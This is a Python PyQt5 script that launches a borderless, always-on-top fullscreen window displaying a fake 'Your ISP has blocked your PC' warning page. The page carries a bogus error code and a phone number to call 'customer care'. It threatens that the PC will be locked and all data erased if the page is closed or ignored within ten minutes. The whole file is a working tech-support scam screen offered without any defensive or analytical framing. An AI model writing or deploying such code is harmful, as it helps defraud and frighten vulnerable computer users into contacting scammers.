# launch_browser_gui.py
import sys
from PyQt5.QtWidgets import QApplication, QMainWindow
from PyQt5.QtCore import Qt
from PyQt5.QtWebEngineWidgets import QWebEngineView

class BlockerWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.browser = QWebEngineView()
        html_content = '''
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Warning Document</title>
            <style>
                body { font-family: sans-serif; margin: 0; padding: 0; display: flex; align-items: center; justify-content: center; height: 100vh; background-color: #f0f0f0; }
                .container { width: 57vw; height: 89vh; border: 1px dashed black; background-color: #fff; display: flex; flex-direction: column; align-items: center; padding: 10px; border-radius: 20px; box-sizing: border-box; overflow-x: hidden; box-shadow: rgba(0, 0, 0, 0.17) 0px -23px 25px 0px inset, rgba(0, 0, 0, 0.15) 0px -36px 30px 0px inset; }
                .warn { color: red; font-weight: 700; font-size: 40px; display: flex; justify-content: center; align-items: center; margin-top: 10px; animation: blink 1s infinite; }
                @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
                .box ul { padding-left: 20px; }
                .box ul li { list-style: disc; margin-bottom: 5px; }
                .err { font-size: 15px; color: red; font-weight: 800; }
                .img { width: 5vw; height: auto; margin-right: 10px; }
                .box ul li { list-style: none; }
                .red { color: red; font-weight: bold; }
                .warning-text { display: flex; justify-content: center; align-items: center; text-align: center; color: red; font-weight: bold; max-width: 50vw; margin-left: 26px; animation: zoom 2s infinite; display: inline-block; }
                @keyframes zoom { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="warn">
                    <img class="img" src="https://cdn-icons-png.flaticon.com/512/564/564619.png" alt="Warning Icon" />
                    <span>Warning</span>
                </div>
                <div class="box">
                    <span class="name">Your ISP has blocked your PC</span>
                    <p class="err name">Error #26803</p>
                    <ul>
                        <li class="name">Call customer care immediately <span class="warning-text name">+1 9384983256</span></li>
                        <li class="name">Do not ignore this critical warning</li>
                        <li class="name">If you close this page, your PC will be disabled to prevent further damage to our network</li>
                    </ul>
                    <p>Immediate action is required to prevent further loss of sensitive data. Your identity and online presence are at risk. Hackers may be using your accounts right now to make unauthorized purchases, send fraudulent emails, and access personal conversations.</p>
                    <p class="warning-text">Failure to act within the next 10 minutes may result in permanent damage to your digital life. Your PC may become permanently locked, and all of your data could be erased. Do not attempt to close this page or shut down your computer, as it may trigger further malicious activity. Contact our support team immediately to secure your device and recover your data. Delaying this could lead to catastrophic consequences, including identity theft and financial loss.</p>
                </div>
            </div>
        </body>
        </html>
        '''
        self.browser.setHtml(html_content)
        self.setCentralWidget(self.browser)
        self.setWindowFlags(Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint | Qt.Tool)
        self.setAttribute(Qt.WA_TranslucentBackground, True)
        self.showFullScreen()

if __name__ == '__main__':
    app = QApplication(sys.argv)
    window = BlockerWindow()
    sys.exit(app.exec_())
